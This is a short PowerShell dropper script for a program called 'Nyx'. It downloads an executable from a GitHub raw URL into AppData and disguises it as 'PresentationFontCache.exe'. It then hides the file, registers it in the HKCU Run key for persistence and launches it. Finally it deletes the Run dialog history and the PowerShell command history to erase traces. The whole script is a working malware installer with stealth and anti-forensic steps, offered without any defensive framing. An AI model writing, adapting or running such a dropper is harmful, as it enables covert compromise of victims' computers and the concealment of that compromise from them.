# Nyx - 9JS85DGP

# Create folder for Nyx
New-Item -Path "$env:APPDATA" -Name "9JS85DGP" -ItemType Directory

# Download Nyx
Invoke-WebRequest https://raw.githubusercontent.com/VVolfCZ/ProjectNyx/main/9JS85DGP/9JS85DGP.exe -OutFile "$env:APPDATA\9JS85DGP\9JS85DGP.exe"

# Change Nyx name
Rename-Item -Path "$env:APPDATA\9JS85DGP\9JS85DGP.exe" -NewName "PresentationFontCache.exe"

# Hide Nyx
$FILE=Get-Item "$env:APPDATA\9JS85DGP\PresentationFontCache.exe" -Force
$FILE.attributes='Hidden'

# Add Nyx to startup processes
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
-Name "9JS85DGP" `
-Value "$env:APPDATA\9JS85DGP\PresentationFontCache.exe"

# Run Nyx
& "$env:APPDATA\9JS85DGP\PresentationFontCache.exe"

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
